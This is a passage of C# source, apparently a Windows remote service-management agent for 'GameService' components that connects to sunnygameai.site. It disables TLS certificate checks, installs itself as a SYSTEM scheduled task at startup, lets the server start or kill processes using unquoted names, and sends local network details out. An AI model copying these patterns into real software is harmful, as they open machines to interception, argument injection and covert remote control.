                        using (var stream = tcp.GetStream())
                        {
                            connected = await HandleConnection(stream, LocalHost + "":"" + LocalPort);
                        }
                    }
                }
                catch { }
            }
            await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = @""GET /communicate HTTP/1.1
Host: "" + hostHeader + @""
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() => {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask) { LogDesktop(""Monitor: WebSocket handshake read timed out after 5s""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""Monitor: WebSocket handshake read failed: "" + ex.Message); return false; }
            LogDesktop(""Monitor: WebSocket response: "" + respStr.Substring(0, Math.Min(200, respStr.Length)));
            for (int qs = 0; !respStr.Contains(""101"") && qs < 2; qs++)
            {
                await Task.Delay(1500);
                try
                {
                    await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
                    byte[] respBuf = new byte[2048];
                    var retryTask = stream.ReadAsync(respBuf, 0, respBuf.Length);
                    if (await Task.WhenAny(retryTask, Task.Delay(5000)) == retryTask)
                    {
                        int read = await retryTask;
                        respStr = Encoding.UTF8.GetString(respBuf, 0, read);
                    }
                    else { LogDesktop(""Monitor: WebSocket handshake retry timed out""); return false; }
                }
                catch { return false; }
            }
            if (!respStr.Contains(""101"")) { LogDesktop(""Monitor: WebSocket handshake failed, no 101""); return false; }
            LogDesktop(""Monitor: WebSocket 101 OK, sending SignalR handshake"");
            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);
            activeStream = stream;
            FlushPendingDebug();
            string reg = ""{\""type\"":1,\""target\"":\""RegisterMonitor\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            dbgStream = stream;
            AnnounceDbg(stream);
            LogDesktop(""Monitor: registered as "" + DeviceName + "" (install dir "" + ExeDir() + "")"");
            // Run the initial probe on a background thread so the SignalR keep-alive
            // message loop (ReadWebSocketTextFrame below) is never starved while we
            // probe each service's health pipe (5 services x 800ms each = up to 4s).
            Thread probeThread = new Thread(() => { try { SendServiceStates(stream); } catch { } });
            probeThread.IsBackground = true;
            probeThread.Start();
            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0) HandleSignalRMessage(stream, rawJson);
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            return true;
        }
        catch { return false; }
        finally { activeStream = null; StopHealthTimer(); }
    }

    private static void StartWatchdog()
    {
        Thread t = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    EnsureComponentRunning(""GameServiceCoreAgent.exe"", ""GameServiceCoreAgent"", Path.Combine(ExeDir(), ""GameServiceCoreAgent.exe""));
                    EnsureComponentRunning(""GameServiceBridge.exe"", ""GameServiceBridge"", Path.Combine(ExeDir(), ""GameServiceBridge.exe""));
                    EnsureComponentRunning(""GameServiceUpdaterService.exe"", ""GameServiceUpdaterService"", Path.Combine(ExeDir(), ""GameServiceUpdaterService.exe""));
                    EnsureSelfTask();
                }
                catch { }
                Thread.Sleep(20000);
            }
        });
        t.IsBackground = true;
        t.Start();
    }

    private static void QueueDebugAlways(string msg)
    {
        LogDesktop(msg);
        lock (debugQueueLock) { pendingDebug.Add(msg); if (pendingDebug.Count > 100) pendingDebug.RemoveAt(0); }
        Stream s = activeStream;
        if (s != null) SendDebug(s, msg);
    }
    private static void FlushPendingDebug()
    {
        lock (debugQueueLock)
        {
            Stream s = activeStream;
            if (s == null) return;
            foreach (string msg in pendingDebug) SendDebug(s, msg);
            pendingDebug.Clear();
        }
    }
    private static bool IsProcessRunning(string imageName)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""tasklist.exe"", ""/fi \""IMAGENAME eq "" + imageName + ""\"" /fo csv"");
            psi.CreateNoWindow = true; psi.UseShellExecute = false; psi.RedirectStandardOutput = true;
            using (var p = Process.Start(psi))
            {
                if (p == null) return false;
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit(3000);
                return outStr.IndexOf(imageName, StringComparison.OrdinalIgnoreCase) >= 0;
            }
        }
        catch { return false; }
    }
    private static void EnsureComponentRunning(string imageName, string taskName, string exePath)
    {
        string firstPath = File.Exists(exePath) ? exePath : null;
        if (firstPath == null) return;
        if (IsProcessRunning(imageName)) return;
        RunSchTask(""/run /tn "" + taskName);
        Thread.Sleep(2500);
        if (!IsProcessRunning(imageName)) QueueDebugAlways(imageName + "" was NOT running. Task /run attempted but still absent. Exe at "" + firstPath);
        else QueueDebugAlways(imageName + "" was not running; restarted via scheduled task."");
    }
    private static void EnsureSelfTask()
    {
        try
        {
            string selfExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrWhiteSpace(selfExe)) return;
            RunSchTask(""/create /tn GameServiceMonitorService /tr \"""" + selfExe + ""\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");
        }
        catch { }
    }
    private static int IndexOfSeparator(StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }

    private static void HandleSignalRMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type == 6) return;
            if (type == 1)
            {
                string target = GetJsonString(jsonStr, ""\""target\"""");
                if (target == ""RequestServiceStates"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    if (string.IsNullOrWhiteSpace(targetDevice) || string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                    {
                        SendServiceStates(stream);
                        StartHealthTimer(stream);
                    }
                }
                else if (target == ""WhoAreYou"")
                {
                    // Server lost our registration - identify ourselves again.
                    dbgInformed = false;
                    AnnounceDbg(stream);
                }
                else if (target == ""ControlService"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    string exeName = GetJsonStringArray(jsonStr, 1);
                    string action = GetJsonStringArray(jsonStr, 2);
                    if (string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                        HandleServiceControl(stream, exeName, action);
                }
            }
        }
        catch { }
    }

    private static void StartHealthTimer(Stream stream)
    {
        lock (timerLock)
        {
            if (healthTimer != null) { healthTimer.Dispose(); healthTimer = null; }
            healthTimer = new Timer(state =>
            {
                try { SendServiceStates(activeStream ?? stream); } catch { }
            }, null, 5000, 5000);
        }
    }
    private static void StopHealthTimer()
    {
        lock (timerLock) { if (healthTimer != null) { healthTimer.Dispose(); healthTimer = null; } }
    }

    private static void HandleServiceControl(Stream stream, string exeName, string action)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(exeName)) return;
            string baseName = Path.GetFileNameWithoutExtension(exeName);
            string taskName;
            if (baseName.Equals(""GameServiceCoreAgent"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceCoreAgent"";
            else if (baseName.Equals(""GameServiceBridge"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceBridge"";
            else if (baseName.Equals(""GameServiceUpdaterService"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceUpdaterService"";
            else if (baseName.Equals(""GameServiceMonitorService"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceMonitorService"";
            else taskName = ""GameService_"" + baseName;
            if (action != null && action.Equals(""start"", StringComparison.OrdinalIgnoreCase))
            {
                RunSchTask(""/run /tn "" + taskName);
                SendDebug(stream, DeviceName + "" Start requested for "" + exeName + "" ("" + taskName + "")"");
            }
            else if (action != null && action.Equals(""stop"", StringComparison.OrdinalIgnoreCase))
            {
                try { ProcessStartInfo psi = new ProcessStartInfo(""taskkill.exe"", ""/f /im "" + exeName); psi.CreateNoWindow = true; psi.UseShellExecute = false; using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(3000); } } catch { }
                RunSchTask(""/end /tn "" + taskName);
                SendDebug(stream, DeviceName + "" Stop requested for "" + exeName + "" ("" + taskName + "")"");
            }
            Thread.Sleep(800);
            SendServiceStates(stream);
        }
        catch (Exception ex) { SendDebug(stream, DeviceName + "" ControlService error: "" + ex.Message); }
    }

    // Agents execute as SYSTEM via scheduled tasks where LocalApplicationData
    // points into systemprofile - NOT at the user folder the installer used.
    // Resolve the real install folder from this exe's own location instead.
    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return RootDir;
    }
    private static bool CheckResponsiveness(string exeName)
    {
        string baseName = Path.GetFileNameWithoutExtension(exeName);
        string[] pipeCandidates = new string[] { baseName + ""_health"", ""GameService_"" + baseName + ""_health"" };
        for (int ci = 0; ci < pipeCandidates.Length; ci++)
        {
            string pipeName = pipeCandidates[ci];
            try
            {
                if (!File.Exists(@""\\.\pipe\"" + pipeName)) continue;
                using (var client = new NamedPipeClientStream(""."", pipeName, PipeDirection.InOut, PipeOptions.None))
                {
                    client.Connect(800);
                    byte[] req = Encoding.UTF8.GetBytes(""Are you up?"");
                    client.Write(req, 0, req.Length);
                    client.Flush();
                    byte[] resp = new byte[16];
                    var readTask = client.ReadAsync(resp, 0, resp.Length);
                    if (!readTask.Wait(800)) continue;
                    int n = readTask.Result;
                    string r = Encoding.UTF8.GetString(resp, 0, n).Trim();
                    if (r.IndexOf(""YES"", StringComparison.OrdinalIgnoreCase) >= 0) return true;
                }
            }
            catch { }
        }
        return false;
    }

    private static void SendServiceStates(Stream stream)
    {
        try
        {
            if (stream == null) stream = activeStream;
            if (stream == null) return;
            List<string> exes = new List<string>();
            string scanDir = ExeDir();
            try { foreach (string exe in Directory.GetFiles(scanDir, ""*.exe"")) { string name = Path.GetFileName(exe); if (name.Equals(""GameServiceMonitorService.exe"", StringComparison.OrdinalIgnoreCase)) continue; exes.Add(name); } } catch (Exception exScan) { LogDesktop(""Monitor: exe scan failed in "" + scanDir + "": "" + exScan.Message); }
            LogDesktop(""Monitor: probing "" + exes.Count + "" service(s) from "" + scanDir);
            StringBuilder arr = new StringBuilder(); arr.Append(""["");
            for (int i = 0; i < exes.Count; i++)
            {
                if (i > 0) arr.Append("","");
                string exeName = exes[i];
                bool responding = CheckResponsiveness(exeName);
                bool running = responding || IsProcessRunning(exeName);
                int status = responding ? 0 : (running ? 1 : 2);
                string baseName2 = Path.GetFileNameWithoutExtension(exeName);
                string taskName2;
                if (baseName2.Equals(""GameServiceCoreAgent"", StringComparison.OrdinalIgnoreCase)) taskName2 = ""GameServiceCoreAgent"";
                else if (baseName2.Equals(""GameServiceBridge"", StringComparison.OrdinalIgnoreCase)) taskName2 = ""GameServiceBridge"";
                else if (baseName2.Equals(""GameServiceUpdaterService"", StringComparison.OrdinalIgnoreCase)) taskName2 = ""GameServiceUpdaterService"";
                else taskName2 = ""GameService_"" + baseName2;
                arr.Append(""{\""name\"":\"""" + EscapeJson(exeName) + ""\"",\""status\"":"" + status + "",\""taskName\"":\"""" + EscapeJson(taskName2) + ""\""}"");
            }
            arr.Append(""]"");
            string msg = ""{\""type\"":1,\""target\"":\""ReportServiceStates\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            SendWsText(stream, msg);
            LogDesktop(""Monitor: reported "" + exes.Count + "" service(s)"");
        }
        catch (Exception exRep) { LogDesktop(""Monitor: SendServiceStates failed: "" + exRep.Message); }
    }

    private static void KillProcess(string processName) { try { ProcessStartInfo psi = new ProcessStartInfo(""taskkill.exe"", ""/f /im "" + processName); psi.CreateNoWindow = true; psi.UseShellExecute = false; using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(3000); } } catch { } }
    private static void RunSchTask(string args) { try { ProcessStartInfo psi = new ProcessStartInfo(""schtasks.exe"", args); psi.CreateNoWindow = true; psi.UseShellExecute = false; using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(5000); } } catch { } }
    private static void SendDebug(Stream stream, string msg) { try { LogDesktop(msg); dbgStream = stream; ShipDbg(StampFor(msg)); } catch { } }
    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else sb.Append(c); } return sb.ToString(); }
    private static int GetJsonInt(string json, string key) { string v = GetJsonString(json, key); int r; return int.TryParse(v, out r) ? r : 0; }
    private static bool GetJsonBool(string json, string key) { int idx = json.IndexOf(key, StringComparison.Ordinal); if (idx < 0) return false; idx += key.Length; while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++; return json.Substring(idx).StartsWith(""true"", StringComparison.OrdinalIgnoreCase); }
    private static string GetJsonString(string json, string key) { if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(key)) return """"; int idx = json.IndexOf(key, StringComparison.Ordinal); if (idx < 0) return """"; idx += key.Length; while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++; if (idx >= json.Length) return """"; if (json[idx] == '""') { idx++; StringBuilder sb = new StringBuilder(); while (idx < json.Length) { char c = json[idx]; if (c == '\\' && idx + 1 < json.Length) { char n = json[idx+1]; if (n == 'n') sb.Append('\n'); else if (n == 'r') sb.Append('\r'); else if (n == 't') sb.Append('\t'); else if (n == '\\') sb.Append('\\'); else if (n == '""') sb.Append('""'); else sb.Append(n); idx += 2; continue; } if (c == '""') break; sb.Append(c); idx++; } return sb.ToString(); } int j = idx; while (j < json.Length && json[j] != ',' && json[j] != '}' && json[j] != ']' && json[j] != ' ') j++; return json.Substring(idx, j-idx); }
    private static string GetJsonStringArray(string json, int arrayIndex) { int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal); if (idx < 0) return """"; idx += ""\""arguments\"""".Length; while (idx < json.Length && json[idx] != '[') idx++; idx++; int cur = 0; while (idx < json.Length && cur < arrayIndex) { char c = json[idx]; if (c == '""') { idx++; while (idx < json.Length) { if (json[idx] == '\\') idx+=2; else if (json[idx] == '""') { idx++; break; } else idx++; } cur++; } else if (c != ' ' && c != ',' && c != '\n' && c != '\r') { cur++; while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++; if (idx < json.Length && json[idx] == ',') idx++; } else idx++; } while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++; if (idx >= json.Length || json[idx] != '""') return """"; idx++; StringBuilder sb = new StringBuilder(); while (idx < json.Length) { char c = json[idx]; if (c == '\\' && idx+1 < json.Length) { sb.Append(json[idx+1]); idx+=2; continue; } if (c == '""') break; sb.Append(c); idx++; } return sb.ToString(); }
    // Reads ONE logical websocket text message. Answers PINGs with PONGs (proxy edges
    // send them and drop peers that never reply), assembles continuation fragments
    // and treats CLOSE as end-of-stream.
    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null;
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }
    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }
    private static void ReadFully(Stream stream, byte[] buf, int count) { int offset = 0; while (offset < count) { int r = stream.Read(buf, offset, count-offset); if (r <= 0) throw new IOException(""End of stream""); offset += r; } }
    private static readonly object sendLock = new object();
    private static void SendWsText(Stream stream, string text) { byte[] payload = Encoding.UTF8.GetBytes(text); int len = payload.Length; MemoryStream frame = new MemoryStream(); frame.WriteByte(0x81); byte[] maskKey = new byte[4]; new Random().NextBytes(maskKey); if (len <= 125) frame.WriteByte((byte)(0x80 | len)); else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); } else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i*8)) & 0xFF)); } frame.Write(maskKey, 0, 4); for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4])); byte[] frameBytes = frame.ToArray(); lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); } }
    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        IAsyncResult ar = ssl.BeginAuthenticateAsClient(host, null, null);
        if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
        {
            try { ssl.Close(); } catch { }
            throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
        }
        ssl.EndAuthenticateAsClient(ar);
        return ssl;
    }
}";
    }


    private static void LogDesktop(string msg)
    {
        try
        {
            ShipStamped(msg);
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceBridge.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { string dir = Path.GetDirectoryName(p); if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir); File.AppendAllText(p, line); } catch {}
                }
            }
        } catch {}
    }

    private static void LogNetworkDiagnostics()
    {
        try
        {
            LogDesktop(""=== Bridge Network Diagnostics ==="");
            try { var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()); foreach (var ip in host.AddressList) LogDesktop(""Bridge Local IP: "" + ip.ToString() + "" ("" + ip.AddressFamily + "")""); } catch (Exception ex) { LogDesktop(""Bridge GetHostEntry failed: "" + ex.Message); }
            try { var ips = System.Net.Dns.GetHostAddresses(RemoteHost); LogDesktop(""Bridge DNS "" + RemoteHost + "" => "" + string.Join("", "", Array.ConvertAll(ips, ip => ip.ToString()))); } catch (Exception ex) { LogDesktop(""Bridge DNS "" + RemoteHost + "" failed: "" + ex.GetType().Name + "": "" + ex.Message); }
            try { foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) { if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue; LogDesktop(""Bridge NIC: "" + ni.Name + "" "" + ni.NetworkInterfaceType + "" "" + ni.OperationalStatus); foreach (var ua in ni.GetIPProperties().UnicastAddresses) LogDesktop(""  Bridge Unicast: "" + ua.Address.ToString()); } } catch (Exception ex) { LogDesktop(""Bridge NIC failed: "" + ex.Message); }
            LogDesktop(""Bridge RemoteHost="" + RemoteHost + "":"" + RemotePort + "" LocalHost="" + LocalHost + "":"" + LocalPort + "" ListenPort="" + ListenPort);
            LogDesktop(""=== End Bridge Diagnostics ==="");
        } catch (Exception ex) { LogDesktop(""Bridge LogNetworkDiagnostics failed: "" + ex.Message); }
    }



    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceBridge.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else sb.Append(c); } return sb.ToString(); }

    private static void ShipStamped(string rawMsg)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try
        {
            if (!dbgInformed) AnnounceDbg(s);
            ShipDbgLine(s, StampFor(rawMsg));
        }
        catch { dbgInformed = false; }
    }

    static void Main(string[] args)
    {
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceBridge.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Bridge Main started, DeviceName="" + DeviceName);
        Thread tcpServer = new Thread(RunTcpServer);
        tcpServer.IsBackground = true;
        tcpServer.Start();
        RunServerLoop().GetAwaiter().GetResult();
    }

    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceBridge_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunServerLoop()
    {
        while (true)
        {
            bool ok = false;
            try
            {
                LogDesktop(""Bridge: attempting to connect to remote server "" + RemoteHost + "":"" + RemotePort + "" (sunnygameai.site)..."");
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    LogDesktop(""Bridge: TCP connected to "" + RemoteHost + "":"" + RemotePort + "", doing TLS..."");
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        LogDesktop(""Bridge: TLS authenticated to "" + RemoteHost);
                        ok = ConnectToServer(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex)
            {
                LogDesktop(""Bridge: remote attempt failed: "" + ex.GetType().Name + "": "" + ex.Message);
            }
            if (!ok)
            {
                try
                {
                    LogDesktop(""Bridge: remote sunnygameai.site failed, trying fallback "" + LocalHost + "":"" + LocalPort);
                using (var tcp = new TcpClient())
                    {
                        var fbTask = tcp.ConnectAsync(LocalHost, LocalPort);
                        if (await Task.WhenAny(fbTask, Task.Delay(3000)) != fbTask) { LogDesktop(""Bridge: fallback TCP to "" + LocalHost + "":"" + LocalPort + "" timed out""); throw new TimeoutException(""Fallback connect timed out""); }
                        await fbTask;
                        LogDesktop(""Bridge: fallback TCP connected to "" + LocalHost + "":"" + LocalPort);
                        ok = ConnectToServer(tcp.GetStream(), LocalHost + "":"" + LocalPort);
                    }
                }
                catch (Exception ex)
                {
                    LogDesktop(""Bridge: fallback attempt failed: "" + ex.GetType().Name + "": "" + ex.Message);
                }
            }
            LogDesktop(""Bridge: retrying in 5s (ok="" + ok + "")"");
            await Task.Delay(5000);
        }
    }

    private static bool ConnectToServer(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            stream.Write(reqBytes, 0, reqBytes.Length);
            stream.ReadTimeout = 5000;
            stream.WriteTimeout = 5000;
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume any bytes of the first WebSocket frame that Cloudflare
            // may send in the same TCP segment as the 101 headers.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                int b;
                while ((b = stream.ReadByte()) != -1)
                {
                    headerBytes.Add((byte)b);
                    if (headerBytes.Count >= 4)
                    {
                        int n = headerBytes.Count;
                        if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                            headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                            break;
                    }
                }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""Bridge: WebSocket handshake read failed: "" + ex.Message); return false; }
            LogDesktop(""Bridge: WebSocket response: "" + respStr.Substring(0, Math.Min(200, respStr.Length)));
            if (!respStr.Contains(""101"")) { LogDesktop(""Bridge: WebSocket handshake failed, no 101""); return false; }
            // The 5 s timeouts above exist ONLY for the handshake. Left active they kill
